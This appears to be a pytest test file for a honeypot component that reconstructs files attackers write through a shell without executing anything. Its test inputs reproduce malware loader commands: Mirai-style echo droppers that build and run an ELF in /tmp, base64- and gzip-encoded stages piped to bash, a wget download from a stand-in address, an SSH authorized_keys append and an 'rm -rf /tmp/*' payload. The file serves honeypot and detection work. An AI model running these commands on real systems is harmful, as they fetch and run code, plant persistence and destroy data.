"""What an attacker writes through the shell, recovered without running it.

Every shape here is one loaders use in the wild. Addresses are from the
RFC 5737 documentation ranges and the payload bytes are synthetic.
"""

import base64
import gzip

from honeypot.capture.shell_writes import interpret, needs_continuation


def _file(result, path):
    """The assembled content of one path, applying appends in order."""
    content = b""
    for write in result.writes:
        if write.path == path:
            content = content + write.content if write.append else write.content
    return content


class TestEchoLoader:
    def test_chunks_assemble_into_the_exact_binary(self):
        """The Mirai echoloader: a binary delivered a few bytes at a time."""
        line = (
            "cd /tmp || cd /var/run; "
            "echo -ne '\\x7f\\x45\\x4c\\x46\\x01\\x02' > .s; "
            "echo -ne '\\x00\\xff\\x10' >> .s; "
            "chmod +x .s; ./.s"
        )
        result = interpret(line, cwd="/home/user")
        assert _file(result, "/tmp/.s") == b"\x7fELF\x01\x02\x00\xff\x10"
        assert {w.method for w in result.writes} == {"echo"}

    def test_echo_without_e_keeps_backslashes_literal(self):
        # bash's echo only interprets escapes when asked to.
        result = interpret("echo '\\x41' > /tmp/a")
        assert _file(result, "/tmp/a") == b"\\x41\n"

    def test_octal_escapes_under_echo_e(self):
        result = interpret("echo -en '\\0101\\0102' > /tmp/b")
        assert _file(result, "/tmp/b") == b"AB"

    def test_backslash_c_stops_output(self):
        result = interpret("echo -e 'kept\\cdropped' > /tmp/c")
        assert _file(result, "/tmp/c") == b"kept"


class TestDecoders:
    def test_base64_preserves_case(self):
        """The emulator used to lowercase commands, which destroys base64."""
        payload = b"#!/bin/sh\nwget http://198.51.100.7/Bins/X86\n"
        encoded = base64.b64encode(payload).decode()
        result = interpret(f"echo {encoded} | base64 -d > /tmp/i.sh")
        assert _file(result, "/tmp/i.sh") == payload
        assert result.writes[-1].method == "base64"

    def test_base64_with_ignore_garbage_and_line_breaks(self):
        encoded = base64.b64encode(b"\x7fELF" + bytes(range(64))).decode()
        wrapped = encoded[:20] + "\\n" + encoded[20:]
        result = interpret(f"printf '{wrapped}' | base64 -di > /tmp/x")
        assert _file(result, "/tmp/x") == b"\x7fELF" + bytes(range(64))

    def test_herestring(self):
        encoded = base64.b64encode(b"payload").decode()
        result = interpret(f"base64 --decode <<< {encoded} > /tmp/h")
        assert _file(result, "/tmp/h") == b"payload"

    def test_hex_via_xxd(self):
        result = interpret("echo 7f454c46 | xxd -r -p > /tmp/elf")
        assert _file(result, "/tmp/elf") == b"\x7fELF"

    def test_gzip_inside_base64(self):
        inner = b"#!/bin/sh\necho compressed stage\n"
        encoded = base64.b64encode(gzip.compress(inner)).decode()
        result = interpret(f"echo {encoded} | base64 -d | gunzip > /tmp/z.sh")
        assert _file(result, "/tmp/z.sh") == inner

    def test_gzip_bomb_is_refused_rather_than_expanded(self, monkeypatch):
        from honeypot.capture import shell_writes

        monkeypatch.setattr(shell_writes, "MAX_OUTPUT_BYTES", 1024)
        encoded = base64.b64encode(gzip.compress(b"\x00" * 100_000)).decode()
        result = interpret(f"echo {encoded} | base64 -d | gunzip > /tmp/bomb")
        assert not [w for w in result.writes if w.path == "/tmp/bomb"]

    def test_gzip_stdout_flag_is_not_decompression(self):
        # "--stdout" contains a "d"; it must not be read as -d.
        result = interpret("echo abc | gzip --stdout > /tmp/g")
        assert not result.writes

    def test_invalid_base64_writes_nothing(self):
        result = interpret("echo 'not*base64!' | base64 -d > /tmp/bad")
        assert not result.writes


class TestPrintf:
    def test_hex_escapes_and_arguments(self):
        result = interpret("printf '\\x7fELF%s' tail > /tmp/p")
        assert _file(result, "/tmp/p") == b"\x7fELFtail"

    def test_format_is_reused_for_remaining_arguments(self):
        result = interpret("printf '%s\\n' a b c > /tmp/lines")
        assert _file(result, "/tmp/lines") == b"a\nb\nc\n"

    def test_percent_b_interprets_escapes_in_the_argument(self):
        result = interpret("printf %b '\\x41\\x42' > /tmp/b")
        assert _file(result, "/tmp/b") == b"AB"


class TestHeredocs:
    def test_quoted_delimiter(self):
        line = "cat > /tmp/run.sh << 'EOF'\n#!/bin/sh\ncd /tmp\nEOF\nchmod +x /tmp/run.sh"
        result = interpret(line)
        assert _file(result, "/tmp/run.sh") == b"#!/bin/sh\ncd /tmp\n"
        assert result.writes[0].method == "heredoc"

    def test_dash_form_strips_leading_tabs(self):
        result = interpret("cat <<- END > /tmp/t\n\tindented\n\tEND\n")
        assert _file(result, "/tmp/t") == b"indented\n"

    def test_semicolons_inside_the_body_are_content(self):
        result = interpret("cat > /tmp/k << X\na; b && c | d\nX\n")
        assert _file(result, "/tmp/k") == b"a; b && c | d\n"

    def test_unterminated_heredoc_needs_more_lines(self):
        assert needs_continuation("cat > /tmp/f << EOF") is True
        assert needs_continuation("cat > /tmp/f << EOF\nline") is True
        assert needs_continuation("cat > /tmp/f << EOF\nline\nEOF") is False
        assert needs_continuation("echo done") is False


class TestPaths:
    def test_cd_within_the_line_changes_where_later_writes_land(self):
        result = interpret("cd /var/tmp && echo x > a; cd ..; echo y > b", cwd="/root", home="/root")
        assert [w.path for w in result.writes] == ["/var/tmp/a", "/var/b"]

    def test_fallback_branch_is_captured_but_does_not_move_cwd(self):
        line = "wget http://198.51.100.7/a -O a || cd /var/run || echo -ne '\\x7f' > a; echo -n z > b"
        result = interpret(line, cwd="/tmp")
        assert _file(result, "/tmp/a") == b"\x7f"
        assert _file(result, "/tmp/b") == b"z"

    def test_shm_is_writable(self):
        assert interpret("echo x > /dev/shm/.x").writes[0].path == "/dev/shm/.x"

    def test_relative_to_session_cwd(self):
        result = interpret("echo x > loader", cwd="/var/tmp")
        assert result.writes[0].path == "/var/tmp/loader"

    def test_tilde(self):
        result = interpret("echo key >> ~/.ssh/authorized_keys", cwd="/tmp", home="/root")
        assert result.writes[0].path == "/root/.ssh/authorized_keys"
        assert result.writes[0].append is True

    def test_discarded_targets_are_not_captured(self):
        result = interpret("echo x > /dev/null; echo y 2>/dev/null > /tmp/kept")
        assert [w.path for w in result.writes] == ["/tmp/kept"]

    def test_quoted_separators_do_not_split(self):
        result = interpret("echo 'a; b && c' > /tmp/q")
        assert _file(result, "/tmp/q") == b"a; b && c\n"


class TestPipesAndNesting:
    def test_content_piped_into_a_shell_is_an_execution(self):
        script = b"#!/bin/sh\nrm -rf /tmp/*\n"
        encoded = base64.b64encode(script).decode()
        result = interpret(f"echo {encoded} | base64 -d | bash")
        assert result.executions[0].content == script
        assert result.executions[0].interpreter == "bash"
        assert not result.writes

    def test_tee_writes_and_passes_through(self):
        result = interpret("echo hello | tee -a /tmp/one /tmp/two > /tmp/three")
        assert {w.path for w in result.writes} == {"/tmp/one", "/tmp/two", "/tmp/three"}

    def test_sh_dash_c_is_interpreted(self):
        result = interpret("sh -c \"echo -n nested > /tmp/n\"")
        assert _file(result, "/tmp/n") == b"nested"

    def test_busybox_applets(self):
        result = interpret("busybox echo -ne '\\x41' > /tmp/bb")
        assert _file(result, "/tmp/bb") == b"A"

    def test_reading_a_file_written_earlier(self):
        encoded = base64.b64encode(b"second stage").decode()
        line = f"echo {encoded} > /tmp/b64; base64 -d /tmp/b64 > /tmp/out"
        result = interpret(line)
        assert _file(result, "/tmp/out") == b"second stage"

    def test_reading_from_the_session_store(self):
        store = {"/tmp/prev": base64.b64encode(b"from earlier") + b"\n"}
        result = interpret("base64 -d < /tmp/prev > /tmp/next", read_file=store.get)
        assert _file(result, "/tmp/next") == b"from earlier"


class TestTerminalOutput:
    def test_plain_echo_strips_quotes(self):
        assert interpret('echo "hello world"').stdout == b"hello world\n"

    def test_redirected_echo_prints_nothing(self):
        assert interpret("echo x > /tmp/f").stdout == b""

    def test_unknown_commands_make_output_unknowable(self):
        assert interpret("echo a | awk '{print}'").stdout is None


class TestBounds:
    def test_pathological_input_does_not_hang(self):
        interpret(";" * 100_000)
        interpret("'" * 50_000)
        interpret("<" * 10_000)
        interpret("echo " + "\\" * 10_000)

    def test_statement_count_is_capped(self):
        result = interpret("echo x > /tmp/a;" * 5000)
        assert len(result.writes) <= 512
